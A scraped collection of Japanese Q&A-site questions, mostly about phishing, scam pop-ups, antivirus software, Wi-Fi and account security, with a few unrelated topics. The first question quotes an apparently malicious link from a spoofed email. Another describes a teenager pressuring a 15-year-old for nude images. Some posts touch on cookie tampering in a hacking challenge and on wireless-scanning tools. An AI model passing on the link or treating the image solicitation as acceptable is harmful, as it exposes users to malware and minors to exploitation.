《回答至急！！これはウィルスメールですか？》 こんばんは。 友人から画像のようなメールが届いたので開けてしまったらこのサイトhttp://bit.mathieubourdeau.com/uevksgに行き少しだけ閲覧してしまいました。 でもすぐ怪しいと思い画面を閉じて、友人に聞いたらそんなメールは送っていないと言われすぐにしまった！と思ったのですが時すでに遅しですよね。 これってウィルスに感染したことになりますか？またこの目的ってなんですか？ 私はスマホからこのサイトを見ました。 受信したのはスマホのメールアドレスなのでメルアドをかえるのは面倒ですが個人情報が漏れるのを防げるならメルアドは変更しようと思います。 どなたか詳しい方、メルアドも変えるべきか回答お願いします。 またどうやって友人から私にメールを送れることになったのか、友人もメールアドレスを変更したほうが良いのか等も教えていただけると大変助かります。
にんにんくは一回いくつまではOKですか？ にんにんくだよ!
ID非公開質問をする必要もない内容なのに ID非公開で質問する人の気持ちがわかりません。と 耳に胼胝ができる程あっちこっちで見ます。そんな投稿をする人間にID非公開質問をしている人の気持ちが わかる訳がありません、必要と思われたからシステムが出来たのです。 この仕様が無かったらID非公開質問を貶している人の言う事が全て 筒抜けになるのです、それが人によってはどんなに危険な事か 分らない人には付ける薬がありません。 納得させるのも無理だと思います、否定論者は基本的に○○ですから。
自分は高校2年生ですネットで知り合った中学3年生の女の子に胸の画像などをしつこく頼み送ってもらったんですが これ通報されたら児童ポルノ法などで僕は捕まりますか？
たまにロボットじゃない確認の為とかの歪んだ意味の無い文字を読んで書いたり、写真の中から看板の写真を選んでください。 とかって何であるんですか？ ロボットってネット使うんですか？
Windows10 Home 32bit のデメリットを全て教えて下さい。 自分が知っている確かな情報は、 ①WindowsUpdateが自動的に起動し、更新される。※Home 32 bitでON、OFF可なのか？ ②自分が持っているファイルや画像、その他データーをマイクロソフト社に送信される。見られる？さらに打った文字、1文字、1文字も送信される。 上記２つの情報も合っていますか？ Windows10の色んな情報を教えて下さい。よろしくお願いします。
昨日家で、iPhoneのネットが急に繋がらなくなりました。が、iPhoneのWi-Fiをオフにすると繋がります。 Wi-Fi本体の故障ですかね？？
ワンズレンタカーを事前予約し借りたのですが予約前日にキャンセルすることになりました。ネットでキャンセル手続きをし確認メールは来たのですが、キャンセル料などのメールが来ません。これはキャンセル料は払わなくていいのでしょうか。
至急回答お願いします！！！！いつだったか忘れたんですけど ネットを利用してる際に違うリンクに飛んで いわゆるアダルトサイトにつながったんですけど そこで○○万振り込んでください。 といきなり出たので急いで消したんですけど、 当然、動画も会員登録もしていません。 なんですが今日急に番号も知らないはずなのに、 このようにきました。 ほっといても大丈夫なんでしょうか？
機械音痴の者です。 パソコンに詳しい方、教えて下さい。 自分のパソコンが『ファイル共有ソフト』なのかどうかって どこで分かるのですか？. 裸の写真や個人情報が流れ出てしまった悲劇が昔あったそうです。 それに関する文章を見つけました。（どなたかのブログです） ＞運悪くファイル共有ソフトからウィルスが彼氏のパソコンに感染し パソコンの個人データがネットに流失してしまいます。 しかしまだ画像だけであったがさらに事態は悪化します。 個人情報も流失していてしまい彼氏の勤めていた会社の情報まで流失。 流失した個人名をmixiで検索したら2人とも本名で登録していたので身元が特定されます。 ＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿ そのような悲劇に陥りたくないので （変な写真は撮ってないけど個人情報を守りたいという意味で） 私のパソコンもそのソフトなのかどうか知りたいです。
【至急】SSL証明書に関する質問をさせていただきます。 Webサイトを常時SSLにしたいと思い、少し前に証明書を発行しました。ですが、証明書を発行したのはいいですが、知識が無いのでその後がよく分かりません。 証明書や鍵、中間など何処かに置かなければならないなど有るなど詳しく教えていただければ幸いです。 SSLについて知識がある方至急宜しくお願い致します。
創価学会は、何故、聖教新聞を日経ヴエリタスのように電子化しないのでしょうか？ いつも聖教新聞が入ってたり、なかったりです 電子化でネット配信すれば、不着もないしコストも下がると思うのですが それにしても、前々からいい加減です
軟式野球のボールをネットで買おうと思ったのですが 検定落ちボールが、検定球の半分くらいの値段だったのですが、何処が違うのか、普通に使えるのか教えてください。
シャープ製AQUOSの文字フォント変更を したいのですがフォントを選択すると 変更されずに下のような画面に戻って きてしまいます...(泣) 何かいい方法ありませんか？ 私のスマホは安心アクセスという何かに フィルタリングされています。
質問失礼いたします。 グーグルのことで質問です。 ポケモンGOをするために母親がグーグル登録をしたのですが、パスワードを忘れてしまいました。 最後のパスワードの文字も覚えていないようです・・・。メモもしてないみたいです どうにかなりませんか？ よろしくお願いいたします。
長文になります 昔ＰＣ内にウイルスがいて 変な催促？みたいのをされていたのですが （うろ覚えなのですが、 インストールを完了させろみたいなを英語で書いてありました） その後xp→7にし そういった催促みたいなものは消えました 去年マザーボードや色んなものを 取り替えたのですが xp,7時代に使っていたHDDはいまだに使っています ここで質問なのですが そのウイルスはxp→7にした時点で消えたと考えてもよいのでしょうか？ それともなんらかのかたちで残っている可能性はあるでしょうか？ （セキュリティソフトはウイルスバスターをつかっていますが フルスキャンしても見つかりませんでした）
セキュリティソフトについて セキュリティソフト（カスペルスキー等）使っていて思ったのですが、定義ファイルを自動でアップデートされるじゃないですか？しかし無線LANとかだとたまに電波が悪くなって、自動で更新されない時があるんです その時には手動でアップデートするのですが、その際に定義ファイルが最新ではないと注意が出るのですが、その定義ファイルが最新のものでない状態の時はコンピュータは保護されている状態なのですか？
Windowsデフェンダーがあれば お金出してまでウィルスバスターは入りませんよね。 実際どうなんでしょうか 教えて下さい。
アンドロイド セキュリティアプリはどれがいいですか？ 私なりに探してノートンさんに決めようかと思いましたが 権限にカメラの許可があるのがよくわからず、気になってやめました。 使いそうにないのはgps機能と外出先のWiFiの安全性を調べるものです。 後は社員さんに個人情報を楽しむ人がいない所が良いです。 よろしくお願いします。
スカイプをパソコン起動時に自動で立ち上がるように設定してあるのですが立ち上がりません。原因が分かる方いますか？パソコンのOSはウインドウズ１０です。セキュリティーはウイルスバスターが入っているのですがこちらをアップデートしてから立ち上がらなくなりました。これが原因なのでしょうか？
スマホ紛失時ＬＩＮＥアカウントについて 現在、回線停止手続きをし、そのスマートフォンには電波が入らない状態にしています。しかし、そのスマートフォンにはwifiの電波を拾うことでネットにつなげる事が可能になります。 その時にＬＩＮＥアプリを起動した場合、持ち主である私のアカウントを使えるようになってしまいます。 その悪用を防ぐために、私の自宅ＰＣからログインをし、パスワードを変えようと思います。 ただ、ＰＣからＬＩＮＥにログインするには一度、スマホに認証コードを入力しないといけないのですが その過程を飛ばしてＰＣでログインし、パスワードだけでも変える。これは可能でしょうか？
出会い系サイトをやって見ようかと思っている20代女性ですが、若干怖くて踏み切れません。 悪徳サイトが大半だとも聞きますが、まともなサイトもちゃんとあると聞きました。であるならば、そういうサイトにぶつかれば全然問題無いのだと思います。 それか、いっその事、アメピグやfacebookを使って、良さげな娘にどんどんアタックした方が安全そうだから、そっちの方がいいんですかねぇ。。。 まぁ、ツイッターとかmixiでもいいんですけど。 ・・・・・色々考えると何だか判らなくなって来ました。 ネットで確実で安全に出会うにはどうすればいいんでしょうか？ アタックするにしても、メールの内容とかも工夫がいるんでしょうねぇ。。。 とりとめの無い質問になってしまいましたが安全な出会い系はどこですか？ それとも無難にmixiがいいですかFacebookがいいですか？
助けてくださいGoogleでウイルスの警告が出ました アプリをインストールしてしまいました あとＯＫボタンも押してしまいまた どうしたらいいですか
遠隔操作「rescue by logmein」の危険性について教えてください。 米国のYahooメールがロックされて使えなくなったため 1-800-478-8053へ問い合わせたところrescue by logmeinという遠隔操作のソフトをダウンロードするよう指示され遠隔操作されました。途中で不安になり中断してもらいました。その後ウイルススキャンをしましたが、特に何も検出されませんでした。 この電話サポートはネットで調べたところYahooの正式なものではないみたいで不安です。 今回の遠隔操作中または今後このパソコンを使い続けることで私のパソコンからいろいろなアカウントのIDやパスワードが抜き取られた、または抜き取られるということはあるでしょうか。 どういった対策を講じればよいでしょうか。
「ネットリンチするな」「歪んだ正義感を持つな」とかいう意見をどう思いますか。 自分は反対です。 まずい店や接客の悪い店が、悪く書かれるのは当然。 それを、炎上とか言って被害者ぶる。「ネット社会の恐ろしさ」 「直接言えないで匿名で陰口しか叩けない奴ら」とか言って、、ネット使ってる人の悪口言う。 なんでもかんでも理不尽な凶悪クレーマーと、同一視。 恐ろしいのはネットじゃなくて、平気でまずいメシ出したり糞接客してくる、てめえらだろ。 本当に良い店か少なくとも普通の店だったら、一部のキチクレーマー以外、悪く書くわけねえだろっての。 悪いことをした芸能人が炎上するのも、当然。 人のうわさになるのが金になる、人のうわさになるから成り立つ、そういう職業でしょ。 それをネットリンチだのと、言いたい放題。 芸能人のほうがはるかに所得多くて、強いくせに。 弱者ぶって、被害者ぶる。 ウザいですね。 すぐ「炎上で傷ついた」とか言う。 ほんとはほとぼり冷めるの待ってるだけのくせに、ネットで民衆に傷つけられたことにして同情買おうとする。 全部、「陰湿なネットのゆがんだ正義感を持つ人々」のせい。 そんな風に他人に罪をなすりつけてる。 そもそもなんで自分が悪く言われてるのかは、棚上げ。 クソですね。 だいいちエゴサーチしなきゃネットで自分の評判とか分かるわけねえし、傷つくわけねえだろっての。 嘘ばっかつくなって感じですよ。 こういう時芸能人同士も、かばい合ってて、ネットをイジメだとか言って悪く言うからキモいし。 何がイジメだ馬鹿。って感じ。 明らかにお前ら芸ＮＯ人のほうが豪邸に住んでるし、強者だろが。 ちょっとお前らが実際にやった罪を民衆にウワサされたら、それでイジメか。 そういうわけで、食べ物ブログとか芸能人関係の掲示板とかを悪く言う連中にムカついてます。 みなさんどう思いますか。
最近友達に勧められた実況者のMSSPの方々についてなのですが､たくさんの実況動画をだされてるのはしってるのですがこれはおすすめ!!という実況動画があますか?それとMSSPさんの名前とか誰1人知らず顔と名前の見分けが全くつきません ネットで調べてもうまく出てこず；； よろしければ教えて欲しいです｡
AVG AntiVirusがこのようなことになっているのですが、大丈夫でしょうか？このソフトを入れ始めた1月くらいの時はすべてチェックマークがついていたのですが、何週間前からビックリマークがつくようになりました。ウイルスチェックをしましたが、何も発見されませんでした。 これはフリー版だからなのでしょうか？ 修正使用としてもエラーしてしまいます。
ハッキングチャレンジサイト8946のtake7（http://www.hackerschool.jp/hack/take7.php） が解けません。「ファイルにインポートする」を押して、インポートしたファイルの「take7_login_status 0」 というところを「take7_login_status 1」にして、「ファイルからエクスポートする」を押して、編集したやつを選択するんですよね？ それでチャレンジサイトの「簡単ログイン！」を押したのですが、ログインできませんでした。 それで、F12開発者ツールの「ネットワーク」というところで「クッキー」を選んで 「応答cookie」のところを見たら、「take7_login_status 0」になっていました。 ブラウザは、「Internet Explorer 」の11です。 どうしたら変わるのでしょう？教えて下さい。お願いします。 お礼は500枚です。
社内システムのセキュリティ担当者です。とはいえ、スキルに乏しい担当者です。現在、上司より次世代FW（IPS/IDS）の導入を検討しろと指示があり、調査中です。パロアルト、フォーティゲイトなどのアプライアンス製品の導入を検討しています。 現在、社内NWには外部向けサーバーはなく（Web、Mailはホスティング）、今後も設置予定はありません。また旧来からのFW（SSG5)にて、ポート別の通信制御（http,https,pop3,smtp,ftpを適宜通す。外から中は無し）を行っております。 今回、特に標的型攻撃メール/リンク、ランサムウェア対策をまず実施したいと考えております。 １．次世代FWを導入した場合、標的型攻撃の各段階においての効果のあるところ。 （○○の機能によって、××を止めることができる etc） ２．インシデント発生時のトレースに使うために、次世代FWで通信ログを収集したいと思っているが、その取得・保存方法はどうやるのか？（機械内保存？外部保存？外部だったらWinOSなどで可能？） また、ログ取得の定石（プロキシ？！）などがあれば。 以上についてご見識のある方教えてください。
このNIKEとalphaのコラボジャケットどこのサイトで売ってるかわかりますか？ちなみにオークションアプリなどではなくネットで売っているものがいいです
セキュリティ脆弱性対策について伺いますウェブサイトとは無関係のプログラムです。 パケットは飛びません。 ファイルの入出力だけがあります。 こういうプログラムのセキュリティ脆弱性対策って、どう検査したらよいのでしょう？ パケットが、飛ぶプログラムだったら、AppScanで検査していましたが、パケットが飛ばないと検査のしようが思いつきません。 どう検査したらよいか、わかる方がいらっしゃいましたら教えて下さい。
aolメールでセキュリティだとかふざけたのばかり 出て、異常に腹が立って怒鳴り散らしているんですけど これ何とかならないんですか？しかもきちんと合っているのに不正なアクセス、だとか出て 余計腹立ちます。 セキュリティのあれを出なくさせる方法をとにかく教えてください！ 家族にも怒鳴っているから怖がられていて嫌です。
以下のサイトの問16（スケジューリングに関する問題）なのですが 教えて頂ければ幸いです。解説がありません。。。 よろしくお願いします。https://www.engineer.or.jp/c_topics/001/attached/attach_1635_6.pdf
ネットで アノニマスジャパン のホームページがありますが、あれは世界でも有名なアノニマスの日本版、なのですか？それとも名前を借りた偽物ですか？
ケータイがウイルスに感染してしまいました。その後、下に出てるアプリをインストールしてそのままケータイを初期化してしてしまいました。これって大丈夫なのでしょうか？
ESETにファイルを解凍した後自動でスキャンする機能はありますか？
NICやワイヤレスカード、ドライバ、アダプタについて詳しく解説しているサイトを教えてくださいあるいはkali linuxにおいてairodump-ngでネットワークを探しても一つも見つからない理由を教えてください ただし、 ・電波が来ていることは確認済み（家のルータの隣でも見つからなかった） ・wlan1（使用するインターフェース）をwlan1mon（モニターモード）に変更済み ・ifconfig downとmaccchangerとifconfig upというのでは治らなかった ・airmon-ng check killで問題となりうる他のインターフェースを除去？済み です どうしましょう
ネットの掲示板の名無しさんて誰が呟いたのか分からないものですか？
公衆Wi-FiでiPhoneでWindowsをテザリングするときのセキュリティについて喫茶店などの公衆Wi-Fiに、直接Windowsを接続するのは怖いので、一度、iPhoneでWI-Fiを拾ってから、それをUSBでテザリングしようと思っています。 ルーターでいうブリッジモードというものらしいですが、iPhoneでは優先でテザリングするときに限って、ブリッジモードが使えます。 公衆Wi-Fiで見るサイトは、Youtubeだけで、それ以外のサイトを見ることは絶対にありません。 このようにiPhoneを経由してて、公衆につなぐと、セキュリティ的にはどれぐらい高まりますか？なぜ高まるかも専門的に教えてください。 お願いします。
楽天モバイルへ提供している富士通のarrows rm02なのですがrootができますか？開発者設定でブートローダをonにして、もちろんバックアップは取ります。adb接続も忘れずに この後ブートローダはどう立ち上げるのですか？Nexusは電源をoffにした後に電源ボタンと音量を同時に押すと出てくるそうですが… ブートローダをアンロックしinstall-superboot-windows. batをネットから落としてクリックでいけませんかね。 どこ見ても日本製スマホはroot権限は出来ない。富士通ではrootは取れない と書かれていて。 読みずらい文章ですし所処は端折ってありますし間違っているところもあるとおもいますが回答をお願いします。
ネットが若者文化だったのはいつ(2000年代のどの辺)までだったのでしょうか？
《スマホ乗っ取りについて》 本日、恥ずかしながらparty chatというチャットアプリにてトラブルを起こしてしまいました。 私は相手の方と普通にチャットで話していたのですが、急に 「あと1通だ」と相手に言われました。 私はなにがなんだかわからず、 「なにがですか？」と答えたところ、 「ありがとう、これで完了だ」「ネットは怖いんだよ」と相手が急に言い始めました。 そこでわたしは怖くなり、相手をブロックし、アプリも消しました。 これは新手のハッキングなのでしょうか？ アプリで相手と何度もチャットをかわすことでハッキングできるものがあって、私のスマホは乗っ取られてしまったのでしょうか？ 個人情報がたくさん入っているのでとても不安です。 チャットアプリをしていた自分が何よりも悪いのですが、対処法などご存じの方いらっしゃいましたら、教えてください。お願いします。
スマートフォンでのインターネット接続の安全性・匿名性スマートフォンでインターネット接続をしてメールを送る場合、キャリア回線を使う場合にしても、自分が所有のwifiルーターやWimaxを使う場合でも、店舗や公共空間のwifi電波を利用する場合でもいずれの場合でも、自宅のパソコンでインターネットをしてメール等を送るよりも住所や氏名などの個人情報は安全に守られる、つまりセキュリティレベルが高いと言えるでしょうか
フィッシングサイトについて フィッシングサイトって入力してた情報を収集してるだけですか？ ＩＤだったり、パスワードだったり 入力していない情報を勝手に盗まれることはあるのでしょうか？
至急‼コイン50枚でお願いします。 きせかえスタイルという悪質サイトに登録してしまいました。どうやっても退会ができません。ネットで調べた方法でもできませんでした。マイメニューからもできませんでした。退会の仕方を是非教えてください。お願いします。できれば無料期間の2日以内でお願いします。
メールが6月以降受信できなくなりました。 ＯＵＴＬＯＯＫ2003、Windows8.1 設定は変えていません。 メールのサポートに電話をかけ、アカウントの入力などは問題ないことが確認できました。アカウントの設定のテストボタンを押しても「完了」となり問題ないことが確認できました。 送信はできています。 メールサーバーには6月以降のメールがたまっていることを確認しています。 メールサーバーにコピーを置いておく設定はしていません。 セキュリティソフトはマカフィで8月になってから期限切れを起こしましたが、ファイアーウォール、迷惑メールをチェックする設定を切っても受信できません。 ネットは問題なくできています。 原因、解決方法を教えてください。
同じパスワードを複数のウェブサイトで使いまわすのは危険ですか？
SDカードをPCに差し込んで、取り外した際。PC側にSDカードの情報、データの残骸が残ることはありますか？
マカフィーの月額版が買えません。 無料版を使っていましたが、期限が来たのでギフトカードを入れました。 しかし、Google Playの残高利用できませんと表示されます。 どうしたら買えますか？ 無料版は今日中までだそうですから、至急おねがいします。
7月中に Windows10 Pro 64bit にアップグレードを予定しています。ブラウザはＩＥ11になると思います。フリーのセキュリティソフトの1つとして、総合的であること、日本語対応であることから、COMODO Internet Security 2016 を進められています。ネットでも調べてみましたが、このソフトのセキュリティ面での長所、このソフトの弱点を補強するようなフリーソフト、がよくわかりません。 COMODOInternet Security 2016 を使用している方で、または検討中の方で、その組合せ使用例がありましたら、教えていただきたいのですが。
来月8/4に米国ラスベガスでDARPA CYBER GRAND CHALLENGEの決勝が開催されます。ネットで調べて、どういう大会なのか何となく分かったのですが、具体的なルールがよく分かりませんでした。。また実際に会場で観戦した場合、試合中何が起きているか分かるものなのでしょうか？一般にも開放されているようなので、素人が観戦してもある程度は理解できるものと期待してますが、、 誰か詳しい方、回答宜しくお願いします。 https://cgc.darpa.mil/
vlan対応のUSB接続プリントサーバーをご存知の方ご享受ください
企業が処分したような、中古で投げ売りされているルータを弄繰り回す用に1台買って、技術力を高める訓練をしようと思っているのですが、「ヤマハ」のルータと「Cisco」のルータのどちらを買った方が良いでしょうか?
こういう画面がしょっちゅう出ます。詐欺だから、気にせず閉じるようにと、調べたら書いてあるのですが、これが邪魔でネットが使えず困っています。 それに、カウントダウンとか、読み込みをしていますとか、バイブが鳴りまくったりして怖いです。 本当に閉じるだけで大丈夫でしょうか？
ビットコインに詳しい人お願いします！ 最近ビットコインについて調べていますが専門外でいろいろわからないので質問させてください。質問1 ビットコインは、分散型台帳技術（ブロックチェーン）を使った決済システムだそうで、 このビットコインが、セキュリティに強いのは台帳が分散管理であることでという点で納得できるのですが、このチェック機能とプライバシーはどのように共存しているのですか？不正のチェックが働くということと取引者が特定されないことには矛盾がないのでしょうか？ 質問2 ビットコインが唯一無二である点はどんな点ですか？仮想通貨は約600種ちかくあるそうで、ブロックチェーン技術の構築自体は他にもたくさん作れるのではないかと思うのですが、ビットコインには他で真似できない何かががあるのでビットコインに価値があるんだと思うのですが、その価値とはなんですか？ 質問3 ビットコインのシステムについて今後重大な不備があった場合、管理者がいないことで誰が修正を行うのですか？ 質問4 ビットコインについての正式な概要はどこで見られますか？ 以上4点について回答よろしくお願いいたします<m(__)m>
ネットに本名(名字)を書かれました。そこの会社に消去依頼出したんですけど、消してくれません どーしたらいいですか？？
先ほど、最近流行ってるお花が入ったリップクリームを売っていますという謳い文句で、偽物を売ってるツイートを見つけました。そのツイートを引用RTして「これ偽物」とツイートしたら、向こうが色々言ってきました。ここまでははっきりいってどうでもいいんですが、ブロックしてるはずの母がそのことに気づいて「あんたTwitterでなんかしたでしょ」とすぐ電話してきました。 なぜブロックしてるはずの母が私のツイートに気づくことが出来るのでしょうか？
ネットで視聴可能なドラマを観ると、途中でブザー音が鳴って停止します。 そもそも、著作権問題でドラマとかってネット上に出しては駄目なんですよね？コンテンツが削除されました・・という場合は、そういうことが原因ですよね？ お勧めドラマ・・として紹介されているので普通に観てしまうのですが、私も違法行為をしているということになるんですか？ そういう人への防犯のために、このようなブザー音？が鳴るようにしているのでしょうか？ ブーーーーと突然鳴り出して、動画も停止し、鳴り止まないので怖くなって毎回強制終了しています。 それともウィルス？今のところ何も問題ありませんが・・・・
IoTデバイスのハニーポットを作成したいと考えているのですが、何か良い実践方法などありませんか？
絵のタッチのことを「絵柄」って言っていますが、あれは正しいのでしょうか？私はネットをするまで絵柄とは模様などのことを言っていたのですが絵の特徴などに対して使いますか？それは正しいのでしょうか？
ソフトバンクエアーについてネットに繋げるエアーですが、あれって例えば今住んでる場所で使っていて、他の場所へ引っ越しする際、持っていって地域によって繋がる繋がらないがあると思いますが、繋がる様なら違う地域でも使えるんでしょうか？
IEEE802.1Xについての質問です。 ① 無線LANクライアント（サプリカント）は通信を開始するために、AP（認証装置）にプローブ信号 （プローブ要求）を送信します。このタイミングで無線LANクライアントが実行したい認証方式を要求。 ② APは無線LANクライアントから指定された認証方式を通知して、EAP処理を開始します。 ③ 指定された認証方式に従い無線LANクライアントと認証サーバとの間でやりとりします。この時点 では、直接トラフィックをやりとりせずに、APが両者のトラフィックをプロトコル変換をしています。 ④ 認証が成功すると認証サーバから認証が成功したことを通知。この時にポートのブロックが解除。 ⑤ 認証サーバはアクセスポイントに対して、ユーザ用のセッション鍵のもとになる情報を送信します。 ⑥ APは認証サーバから受信したセッション鍵の情報から暗号鍵を生成し、無線LANクライアントに配布。 ⑦ 802.1X認証が無事に終えて、かつトラフィックを暗号化するための鍵を手に入れたので通信を開始。 IEEE802.1Xの認証の仕組みを調べているのですが、なかなかわかりやすいものが出なくて、困っております。（記事によって、この技術を別の視点から眺めているようで私のような初学者には難しいです。） 上に示した説明だと、④からよくわかりません。 「ポートのブロック解除」とは何なのでしょうか。 ⑤から⑦もよくわかりません。 まず、認証サーバからセッション鍵の元となる情報がアクセスポイントに送られており、そこからセッション鍵を元にして、暗号鍵を作っていますが、ここで登場したセッション鍵の意味ってあるのでしょうか。 認証に成功した後、普通に暗号鍵を作って、クライアントに渡せばいいのではないでしょうか。 また、暗号鍵を作ってトラフィックを暗号化しているとのことですが、暗号化すると、インターネット上にあるWebサーバーと通信できるのでしょうか。 その暗号化というのは認証局の後悔しているような鍵ではなく、クライアントが属しているIEEE802.1X独自の暗号化手法ですよね？ どなたか回答お願いします。
outlook2007で仕分けを用いた自動転送がうまくいきません。「受信メールのメッセージヘッダーにある文言が含まれていたらメールを転送する」という設定をしてるのですが たまに転送されないことがあります。エラー等はでていません。 ただし、「受信メールのメッセージヘッダーにある文言が含まれていたらコピー指定フォルダに移動する」も同様に設定しているのですが、こちらは必ずコピーが作成されています。 受信メールのの宛先が社内だと飛んでいますが 社外だと飛んでいないようですが違うかもしれません。 同様の事象が発生したりして原因がわかる方いらっしゃいませんか？
ネット見てたらこんなのでてきたんですがなんですか？
軟式野球のボールをネットで買おうと思ったのですが 検定落ちボールが、検定球の半分くらいの値段だったのですが、何処が違うのか、普通に使えるのか教えてください。
Cookieとキャッシュについて。 詳しい方からのご教授をお願いいたします。少し曖昧な質問になってしまいますが、インターネットサイトの運営側が、クッキーやキャッシュから利用者が同一人物かどうか判断するというのは、どういった方法なのでしょうか？ 例えばですが、某サイトにログインするためには、メールアドレスとパスワードが必要です。アドレスはgmailで登録します。運営側は、アドレス・パスワード・キャッシュから同一人物かどうかを判断します。 違う端末でアカウントを新しく作って(アドレスとパスは変更します)ログインしたとします。以前使用していたアカウント(アドレスとパス）でログインしないままでいれば、同一人物だとはバレないとは思います。ただ、その新しい端末で、その某サイトではなく、gmailに以前使用していたアドレスでログインした場合、その後その某サイトに新しく作ったアカウントでログインしても、「gmailにログインした形跡がある」みたいな判断から同一人物だと判断されてしまうことはありますか？ gmailのメールボックスを開く際にも、gmailアカウントのログイン情報(gmailアドレスとパス)を入力しなければいけません。gmailアカウントと某サイトのアカウントは別物ですが、新しい端末から以前使用していたgmailアドレスでgmailアカウントにログインしたら、その形跡が端末に残って某サイトにログインしたときに紐付けさせるのかどうか気になりました。 うまく説明できませんが、クッキーとかキャッシュについて知識がないもので・・・ご理解いただけた方でわかる方は教えてください。
二つの素数 p= 70051, q= 98179 に対し、N=pq, d=6534648607(gcd(d,(p-1)(q-1))=1) とする。このとき、RSA 署名 S = md mod N の処理を通常実装と CRT 実装の両方で行い、 結果が一致することを確認せよ。 この問題の解き方を教えて下さい。 全く分からないのでまず何を調べたらいいのか、どんなソフトを使えばいいのかなどのアドバイスを下さい
ヤフーやネットなどの履歴削除について。 同じパソコンを家族で一台使っています。（アカウントは別です） 自分のアカウントの履歴を削除しても、管理者は私の削除した履歴を見ることができますか？
質問です。 Twitterでログアウトしてしまい、もう1度ログインしようとしたのですがパスワードを忘れてしまい電話番号かメールアドレスを使ってパスワードをリセットしようとしたのですが、前に4つくらいアカウントを作りすべてログアウトしてしまいそこに電話番号を入れていたので今ログインしようとしているアカウントでも同じ電話番号を入れていてパスワードをリセットしようとするとこの電話番号から複数のアカウントが発見されました？みたいな感じになりパスワードをリセットできません。ちなみにメールアドレスも前のと同じものを使っていたためそっちでもログインできません。Twitterにメールを送ってもメールアドレスを更新としか送られて来ません。 どなたか助けてくださいm(_ _)m
AUひかりの速度について（長文失礼します） AUひかりホームギガ対応にて契約しました。届いた機器ONUとBL900HWをつなげ、実際にスピードを測定してみましたところ（BNRスピードテスト）、 有線でBL900HWからつなげ、下り５０Mbpsくらいしか出ませんが、そんなもんなのでしょうか？ 今までのADSLだと６～７Mbpsだったので、速いと言えば速いのですが、ギガと銘打っているだけに ちょっと物足りない感じがしています。 LANケーブルは５eとなっています。 PCのネットワークアダプタを見てみると、 Qualcomm Atheros AR946ｘ Wireless Network Adapter、Realtek PCIe GBE Family Controllerというものがあります。 セキュリティソフトはノートンを利用、PC自体は２年前ほどに購入。 居住地域は北陸、住宅地です。おそらく周りで光回線利用している家庭は少ないです。 以上のことから、もう少しスピードアップできる可能性はありますでしょうか？ 宜しくお願いいたします。
出来れば至急です。 今回PCからネットへ接続していたら急にネットが繋がらなくなりました。 その時の環境ですが、マインクラフト(開放くんでのポート開放済み)自分のマルチサーバー、スカイプ(PCからではなく、wifiに繋いでいたiPhone)やネット閲覧を行っていました。 その途中スカイプが切れたと思ったらwifiに接続できず、pcのネット接続も機能しなくなりました。二階で有線のpcなので一階のルーターを再起動したのですが、効果はありません。 考えられる理由としては ・スカイプ。ポート開放を行ってサーバーで遊ぶのは初めてではありません。ただ今回は携帯でのスカイプとなったのが前回と異なる点と言えます。サーバーに入る人数は自分を含めて二人なので負荷がある訳ではないと思うのですが…。 ・開放くん。「トラブルシューティングを行った場合デフォルトゲートウェイは仕様できません。」と表示されました。 開放くんでのポート開放ではipアドレスを固定した訳ではなく、マカフィーのファイアーウォールの詳細設定から追加をしたものとなっています。(ローカル tcp/ip ポート 445) あと設定を弄ったものは無いと思います、あやふやな知識で危険な開放をしたのは自分に非があると思いますがサポートセンターなどに連絡するとなると色々面倒なので、出来れば自分で解決したいと思っております。お手数ですがお知恵をお貸しください。お願い致します。 Windows 7 64bit intel core i7
マレーシアのぺトロナスタワーの予約ができません。予約入力はできますが、 相手にネットが届きません。ウインドウズ10が原因ですか？
脱獄についてです。ios9.3.3でも脱獄が可能になりましたので、私もしました。しかし、モバイルターミナルをインストールしても、すぐに落ちてしまいパスワードを変更することごできません。ios9.3.3ではまだモバイルターミナルを使用できないのでしょうか？ また、その場合パスワードを変更する方法はありますでしょうか？ ご返答お待ちしております。
通信環境が少し悪いところで、ネットをしていて少し止まったので画面を連打したら 変なサイトへとんでお金を請求されました。何かの同意をしてしまっていました。その後すぐに、急いで消して履歴も消したのですが、とても不安です。どうすればいいですか？
Canon iVIS HF11 のバッテリーチャージャーをなくしてしまったので買いたいのですが、ネットで探してもありません。どなたか、見つけていただけないでしょうか。
アドウェアが削除できなくて困ってますAdw Cleanerを使って異常なプログラムをすべて削除したのですが、クロームを使ってると変な広告と変な検索バー（play bar という名前）がいまだに出てきます。 解決策を教えてください。
早朝5時に三菱銀行から南都銀行へネットで送金した場合、南都銀行で引出し可能なのは何時からでしょうか？
avast!の無料版を使っています。windows10です。 怖くなってすぐ消したのでうろ覚えなのですが、avastから「PC上に安全でないパスワードがありました」という表示がありました。これは、今まで色々なサイトでログインするときに使ってたパスワードが、avast側に筒抜けになってるってことでしょうか？ 不安でたまりません。回答よろしくお願いします。
すみません！！！緊急回答お願いします！！！！さっきLINE交換したネットの人で顔を見せてと言われました、あたしはネット上に顔出すのが嫌なので断りました、そしたらTwitterを友人のハッカーに頼んでハッキングしてもらうって言われました… そんなことほんとにできるのでしょうか？？ 困ってます！垢を変えるのは嫌です(´；ω；｀) ほんとに誰か回答お願いします！
DriverPack Solution というサイトは、安全ですか？https://drp.su/index.htm パソコンの、見つかりにくいような、ドライバが、 結構簡単に、インストールできて、正常に動作してるようですし、 問題もない感じで、重宝してるサイトなのですが、 一緒に、スパイウェア的なものが、 入れられてるような事は、ないのでしょうか？ （avast! で、ウィルス的なものが見つかった事は、今まで特にありません） ネット検索しても、良い評判も、悪い評判も、見つからず、 優良サイトなら、もっと記事や、PC情報サイトなどで、 紹介されてても良さそうですが、それも、無いようです？ かといって、悪評も、見つからないのですが、 ドライバ検索総合サイトとして、安全なサイトなのでしょうか？
web上には、「行動ターゲティング広告」なるものがあり、ショッピングサイトで検索したものや、関連の商品が、サイト上に表示されると承知しています。ところが最近になって、そういった広告だと思われる欄に、今まで検索した物とは全く無関係な商品や自分の趣味嗜好とは全く異なる嫌悪感すらおぼえるような商品が表示されるようになりました。 ネットで調べてブラウザのCookieやキャッシュを削除しても全くといっていいほど効果がありません。 怖くなっていろいろ調べましたが、対処方法や相談するところなど全くわかりません。 こんなことってあるのでしょうか？
